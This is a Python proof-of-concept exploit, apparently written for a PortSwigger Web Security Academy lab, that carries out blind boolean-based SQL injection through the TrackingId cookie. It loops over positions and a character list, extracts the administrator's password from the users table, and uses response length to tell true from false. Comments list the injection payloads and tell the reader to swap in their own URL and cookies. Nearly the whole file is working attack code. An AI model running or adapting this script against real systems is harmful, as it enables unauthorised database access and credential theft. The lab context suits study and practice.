# POC
# Detect Trackid and Check if it vulnerable for SQL Injection. Payloads : …xyz' AND '1'='1    |||  …xyz' AND '1'='2 
# Use burp Suite and copy requested data as a CURL
# Convert Converted CURL data to python code via https://curlconverter.com/#
# Use this Exloit and Change URL and cookies values
# At this situation we have username and password column into users table. in your case it should be different



import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'Host': '0ab6005e043e8b2ec09c6e2f006c00ab.web-security-academy.net',                              
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'https://0ab6005e043e8b2ec09c6e2f006c00ab.web-security-academy.net/',                  
    'Upgrade-Insecure-Requests': '1', 
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Te': 'trailers',
    'Connection': 'close',
}

params = (
    ('category', 'Pets'),
)



char_list = ["!", "\"", "#", "$", "%", "&", "'", "(", ")", "*", "+", ",", "-", ".", "/", 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, ":", ";", "<", "=", ">", "?", "@", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "[", "]", "^", "_", "`", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "{", "|"]



password = ""


a = 0
for i in range (1,21):

    for j in range(0,91):

        cookies = {
         'TrackingId': f'GphZwl4k9a50jhEE\'  AND SUBSTRING((SELECT password FROM users WHERE Username = \'administrator\'), {i}, 1) = \'{char_list[j]}' ,
         'session': '0bd7lW5T0bvVlLC3KLay7DaRAnB8UrdC',
        }
        
        response = requests.get('https://0ab6005e043e8b2ec09c6e2f006c00ab.web-security-academy.net/filter', headers=headers, params=params, cookies=cookies, verify=False)


        if len(response.content) != 3355:                     #change
            password = password + str(char_list[j])
            print(f"{j} --- {char_list[j]}") 
            break
        

    if len(password)==a :
        break
    a = a + 1

print(password)

